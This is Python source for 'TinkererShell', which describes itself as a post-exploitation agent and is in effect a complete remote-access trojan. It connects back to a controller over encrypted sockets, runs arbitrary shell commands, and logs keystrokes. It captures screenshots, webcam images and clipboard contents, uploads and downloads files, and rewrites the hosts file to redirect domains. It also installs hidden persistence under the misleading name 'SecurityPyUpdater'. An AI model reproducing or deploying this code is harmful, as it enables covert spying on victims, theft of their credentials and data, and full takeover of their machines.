#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
"""TinkererShell bot, a simple agent for post exploitation.\n"""

# Written By Ananke: https://github.com/4n4nk3
import sys

sys.path.append('./modules/')
import shutil
import socket
import subprocess
import os
import tempfile
import threading
import pyperclip
from time import sleep
from base64 import b64encode, b64decode
from filecmp import cmp
from pathlib import Path
import pyscreenshot as ImageGrab
import cv2
from io import BytesIO
from tendo import singleton

# Importing module for autostart written by Jonas Wagner
# http://29a.ch/2009/3/17/autostart-autorun-with-python
import autorun

from my_crypt_func import encode_aes, decode_aes

# Activating persistence (True)
persistenceactivation = False

# Global variables
global thr_block
global thr_exit

# I understand on which system I am and then I import the corrects modules for the keylogger
if os.name == 'nt':
    platform = 'windows'
    import pythoncom
    import pyHook
elif os.name == 'posix':
    platform = 'posix'
    import pyxhook
else:
    sys.exit('System not supported!')

fd_temp, keylogfile = tempfile.mkstemp()
with open(keylogfile, 'w') as f:
    f.write('')


# =================================================================================================

def persistence_install() -> bool:
    """Install persistence.\n"""
    # TODO: test on Linux
    # TODO: test on Windows
    if not autorun.exists('SecurityPyUpdater'):
        path = os.path.abspath(sys.argv[0])
        if platform == 'windows':
            target_to_autostart = str(Path.home()) + os.path.normcase('/demo/sec_upd.exe')
        else:
            target_to_autostart = str(Path.home()) + '/.Xsec_upd'
        if not os.path.isfile(target_to_autostart):
            shutil.copyfile(path, target_to_autostart)
        if platform == 'windows':
            # Try to hide file adding hidden attribute to it
            try:
                subprocess.check_call(["attrib", "+H", target_to_autostart])
            except Exception as exception:
                print(exception)
                return False
        else:
            # Give executable permission to file
            try:
                subprocess.Popen('chmod 700 ' + target_to_autostart, shell=True,
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
            except Exception as exception:
                print(exception)
                return False
        autorun.add('SecurityPyUpdater', target_to_autostart)
        return True
    return False


def persistence_remove() -> bool:
    """Uninstall persistence (disable autorun but can't delete himself).\n"""
    if autorun.exists('SecurityPyUpdater'):
        autorun.remove('SecurityPyUpdater')
        return True
    return False


def persistence_status() -> bool:
    """Check if persistence is installed.\n"""
    if autorun.exists('SecurityPyUpdater'):
        return True
    return False


# Persistence !!!
if persistenceactivation is True:
    persistence_install()

# Verify only one instance of TinkererShell is running
me = singleton.SingleInstance()


def receiver() -> str:
    """Receive data from master, decrypt it and return it.\n"""
    lengthcrypt = s.recv(1024).decode('utf-8')
    expected_length = int(decode_aes(lengthcrypt))
    encrypted_received_data = ''
    while len(encrypted_received_data) < expected_length:
        encrypted_received_data += s.recv(1024).decode('utf-8')
    return decode_aes(encrypted_received_data)


def sender(data_to_send: str) -> None:
    """Encrypt data and send it to master.\n"""
    # If data = 0 I will set an arbitrary string so sending operation will not be NULL
    if not data_to_send:
        data_to_send = 'Ok (no output)\n'
    # Crypting data, obtaining their length and then typecasting it to data_to_send string and crypting it
    encoded = encode_aes(data_to_send)
    length = str(len(encoded))
    length_crypt = encode_aes(length)
    # Sending the length and wait. Then send data
    s.send(bytes(length_crypt, 'utf-8'))
    sleep(1)
    s.send(bytes(encoded, 'utf-8'))


def command_executor(command: str):
    """Execute a command in the system shell and send its output to the master.\n"""
    try:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        # Reading and sending output
        sender((proc.stdout.read() + proc.stderr.read()).decode('utf-8'))
    except Exception as exception:
        sender('reachedexcept')
        sender(str(exception))


def listprocesses():
    """List running processes.\n"""
    if platform == 'windows':
        command_executor('tasklist')
    else:
        command_executor('pstree -u -p')


def killprocesses():
    """Kill a running process.\n"""
    if platform == 'windows':
        sender('Insert the name of the process\t\texample.exe\n')
    else:
        sender('Insert process PID\n')
    process_id = receiver()
    if platform == 'windows':
        command_executor('TASKKILL /IM ' + process_id + ' /F /T')
    else:
        command_executor('kill -9 ' + process_id)


def dnsspoofer(dnsfile: str):
    """Edit hosts file to redirect user when visiting a specified domain.\n"""
    sender('Insert address from which you want to redirect\n')
    orig_address = receiver()
    sender('Insert address to which you want to redirect\n')
    evil_address = receiver()
    if os.access(dnsfile, os.W_OK):
        try:
            f_spoof = open(dnsfile, 'r')
            original_hosts_file = f_spoof.read()
            f_spoof.close()
            f_spoof = open(dnsfile, 'w')
            f_spoof.write(original_hosts_file + '\n' + evil_address + '    ' + orig_address)
            f_spoof.close()
            sender('Operation completed\n')
        except Exception as exception:
            sender(str(exception))
    else:
        sender('Operation aborted! Cannot write to target file!\n')


def dnscleaner(dnsfile: str, dnsbackup: str, send=False):
    """Restore original hosts file from backup made at shell startup.\n"""
    if os.access(dnsfile, os.W_OK):
        try:
            f_clean = open(dnsbackup, 'r')
            buffer = f_clean.read()
            f_clean.close()
            f_clean = open(dnsfile, 'w')
            f_clean.write(buffer)
            f_clean.close()
            if send is True:
                sender('DNS cleaned\n')
        except Exception as exception:
            if send is True:
                sender(str(exception))
    else:
        if send is True:
            sender('Operation aborted! Cannot write to target file!\n')


def keylogs_status():
    """Check if keylogger thread is capturing data.\n"""
    if thr_block.isSet():
        sender('Keylogger is not running!\n')
    else:
        sender('Keylogger is running!\n')


def keylogs_start():
    """Enable keylogger thread to capture data.\n"""
    if thr_block.isSet():
        thr_block.clear()
        sender('Keylogger started!\n')
    else:
        sender('Keylogger is already running!\n')


def keylogs_stop():
    """Disable keylogger thread from capturing data.\n"""
    if not thr_block.isSet():
        thr_block.set()
        sender('Keylogger stopped!\n')
    else:
        sender('Keylogger is not running!\n')


def keylogs_download():
    """Sends keylogged data to the master and delete it from victim host.\n"""
    try:
        with open(keylogfile, 'rb') as f_kd:
            keylogged_data = b64decode(f_kd.read()).decode('utf-8')
        sender(keylogged_data + '\n')
    except Exception as exception:
        sender('reachedexcept')
        sender(str(exception))
    try:
        cleaner = open(keylogfile, 'w')
        cleaner.write('')
        cleaner.close()
    except Exception as exception:
        print(exception)


# TODO: Test on Windows
def screenshot():
    """Takes a screenshot of bot's monitors and sends it to the master.\n"""
    buffer = BytesIO()
    try:
        im = ImageGrab.grab()
        im.save(buffer, format='PNG')
        im.close()
        b64_str = str(b64encode(buffer.getvalue()))
        sender(b64_str[2:-1])
    except Exception as exception:
        sender('reachedexcept')
        sender(str(exception))


# TODO: Test on Windows
def webcam_pic():
    """Takes a picture with bot's webcam and sends it to the master.\n"""
    try:
        video_capture = cv2.VideoCapture(0)
        # Check success
        if video_capture.isOpened():
            # Read picture. ret === True on success
            ret, frame = video_capture.read()
            # Close device
            video_capture.release()
            is_success, buffer = cv2.imencode(".png", frame)
            io_buf = BytesIO(buffer)
            b64_str = str(b64encode(io_buf.getvalue()))
            sender(b64_str[2:-1])
        else:
            sender('reachedexcept')
            sender('Can\'t access any webcam!')
    except Exception as exception:
        sender('reachedexcept')
        sender(str(exception))


# TODO: Test on Windows
def clip_copy():
    """Sends bot's clipboard content to the master.\n"""
    try:
        sender('Clipboard content:\n' + pyperclip.paste())
    except Exception as exception:
        sender(str(exception))


def downloader():
    """Download a file from victim host to master.\n"""
    sender('Insert name of the file\t\t' + os.path.normcase('C:/boot.ini') + '\n')
    try:
        file_name = os.path.normcase(receiver())
        # Reading file in binary form
        f_dow = open(file_name, 'rb')
        a = f_dow.read()
        f_dow.close()
    except Exception as exception:
        sender('reachedexcept')
        a = str(exception)
    sender(a.decode('utf-8'))


def uploader():
    """Upload a file from master to victim host.\n"""
    filename = os.path.normcase(receiver())
    uploaded_data: str = receiver()
    if uploaded_data != 'reachedexcept':
        try:
            # Writing file in binary form
            filewrite = open(filename, 'wb')
            filewrite.write(bytes(uploaded_data, 'utf-8'))
            filewrite.close()
            sender('File saved in ' + filename + '\n')
        except Exception as exception:
            sender(str(exception))
    else:
        sender('Operation aborted\n')


# =================================================================================================

# Defining correct keylogging procedure
def keylogger(fd_temp_key: int):
    """Key logger thread.\n"""

    def OnKeyboardEvent(event):
        """"Define action triggered when a key is pressed.\n"""
        if not thr_block.isSet():
            if event.Ascii != 0 and event.Ascii != 8:
                # Use base64 and not an encryption just for performance
                with open(keylogfile, 'r+b') as f_key:
                    data_decoded = b64decode(f_key.read()).decode('utf-8')
                    f_key.seek(0)
                    if event.Key == 'space':
                        data_decoded += ' '
                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                    elif event.Key == 'BackSpace':
                        data_decoded += '[BackSpace]'
                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                    elif event.Key == 'Return':
                        data_decoded += '[Enter]'
                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                    elif event.Key == 'Shift_L':
                        data_decoded += '[Shift_L]'
                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                    elif event.Key == 'Shift_R':
                        data_decoded += '[Shift_R]'
                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                    elif event.Key == 'Tab':
                        data_decoded += '[Tab]'
                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                    else:
                        data_decoded += event.Key
                        f_key.write(b64encode(data_decoded.encode('utf-8')))
        if thr_exit.isSet():
            os.close(fd_temp_key)
            hm.cancel()
        return True

    # create a hook manager
    if platform == 'windows':
        hm = pyHook.HookManager()
    else:
        hm = pyxhook.HookManager()
    # watch for all mouse events
    hm.KeyDown = OnKeyboardEvent
    # set the hook
    hm.HookKeyboard()
    # wait forever
    if platform == 'windows':
        pythoncom.PumpMessages()
    else:
        hm.start()


# =================================================================================================

def backdoor():
    """Shell thread that connect to master and permit control over the agent.\n"""
    while True:
        host = '127.0.0.1'  # Remote host to which you want the backdoor to connect to
        port = 4444  # The connection port to use

        # Defining global the variables that I need to use in many different functions
        global s

        # Creating the socket
        first_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if platform == 'windows':
            dnsfile = os.getenv('WINDIR') + os.path.normcase('/system32/drivers/etc/hosts')
            dnsbackup = tempfile.gettempdir() + os.path.normcase('/spoofbackup')
        else:
            dnsfile = '/etc/hosts'
            dnsbackup = tempfile.gettempdir() + '/spoofbackup'

        # Backing up Hosts file
        f_bd = open(dnsfile, 'r')
        buffer = f_bd.read()
        f_bd.close()
        f_bd = open(dnsbackup, 'w')
        f_bd.write(buffer)
        f_bd.close()

        # Connection loop
        while True:
            while True:
                if thr_exit.isSet():
                    break
                try:
                    # Connecting to the client
                    first_s.connect((host, port))
                    break
                    # If i cannot connect I wait 2 minutes and then I retry
                except Exception as exception:
                    print(exception)
                    print('>>> New attempt in 2 min')
                    sleep(30)
                    print('>>> New attempt in 1,5 min')
                    sleep(30)
                    print('>>> New attempt in 1 min')
                    sleep(30)
                    print('>>> New attempt in 30 sec')
                    sleep(30)
            if thr_exit.isSet():
                break
            # Sending information relatives to the infected system
            proc = subprocess.run(['whoami'], check=True, stdout=subprocess.PIPE, universal_newlines=True)
            username = proc.stdout.split()[0]
            # First time i send username
            encoded = encode_aes(username)
            length = str(len(encoded))
            length_crypt = encode_aes(length)
            # Sending the length and wait. Then send data
            first_s.send(bytes(length_crypt, 'utf-8'))
            sleep(1)
            first_s.send(bytes(encoded, 'utf-8'))
            print('Connection successful')
            lengthcrypt = first_s.recv(1024).decode('utf-8')
            expected_length = int(str(decode_aes(lengthcrypt)))
            encrypted_received_data = ''
            while len(encrypted_received_data) < expected_length:
                encrypted_received_data += first_s.recv(1024).decode('utf-8')
            new_port = int(decode_aes(encrypted_received_data))
            print('New port is gonna be {}'.format(new_port))
            sleep(5)
            first_s.close()
            # Connecting to the client on the new port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, new_port))
            # Sending information relatives to the infected system
            encoded = encode_aes(username)
            length = str(len(encoded))
            length_crypt = encode_aes(length)
            # Sending the length and wait. Then send data
            s.send(bytes(length_crypt, 'utf-8'))
            sleep(1)
            s.send(bytes(encoded, 'utf-8'))
            break

        # Commands loop
        if not thr_exit.isSet():
            while 1:
                received_command = receiver()
                if received_command != 'KeepAlive':
                    if received_command == 'SHquit':
                        sender('mistochiudendo')
                        break
                    elif received_command == 'SHkill':
                        sender('mistochiudendo')
                        # If thr_exit.set() next keystroke will terminate keylogger thread
                        thr_exit.set()
                        break
                    elif received_command == 'SHprocesslist':
                        listprocesses()
                    elif received_command == 'SHprocesskill':
                        killprocesses()
                    elif received_command == 'SHdnsstart':
                        dnsspoofer(dnsfile)
                    elif received_command == 'SHdnsstop':
                        if cmp(dnsfile, dnsbackup) is False:
                            dnscleaner(dnsfile, dnsbackup, send=True)
                        else:
                            sender('Original hosts file and current one are the same! Nothing to change.')
                    elif received_command == 'SHdownload':
                        downloader()
                    elif received_command == 'SHupload':
                        uploader()
                    elif received_command == 'SHscreenshot':
                        screenshot()
                    elif received_command == 'SHwebcampic':
                        webcam_pic()
                    elif received_command == 'SHclipboard':
                        clip_copy()
                    elif received_command == 'SHkeylogstatus':
                        keylogs_status()
                    elif received_command == 'SHkeylogstart':
                        keylogs_start()
                    elif received_command == 'SHkeylogstop':
                        keylogs_stop()
                    elif received_command == 'SHkeylogdownload':
                        keylogs_download()
                    elif received_command == 'SHpersistenceenable':
                        if persistence_install():
                            sender('Persistence installation successful!')
                        else:
                            sender('Persistence already installed!')
                    elif received_command == 'SHpersistencedisable':
                        if persistence_remove():
                            sender('Persistence remove successful!')
                        else:
                            sender('Persistence not yet installed!')
                    elif received_command == 'SHpersistencestatus':
                        if persistence_status():
                            sender('Persistence is installed.')
                        else:
                            sender('Persistence is not installed.')
                    else:
                        command_executor(received_command)

        # Recreating original hosts file of the system
        if cmp(dnsfile, dnsbackup) is False:
            dnscleaner(dnsfile, dnsbackup)
        try:
            os.remove(dnsbackup)
        except Exception as exception:
            print(exception)
        # Closing socket
        s.close()
        print('Connection closed')
        if thr_exit.isSet():
            break
        sleep(120)
    return True


thr_block = threading.Event()
thr_exit = threading.Event()

# Keylogger's thread
thread1 = threading.Thread(name='sic1', target=keylogger, args=[fd_temp]).start()
# Backdoor's thread
thread2 = threading.Thread(name='sic2', target=backdoor).start()

# TODO: Add Webcam stream and microphone
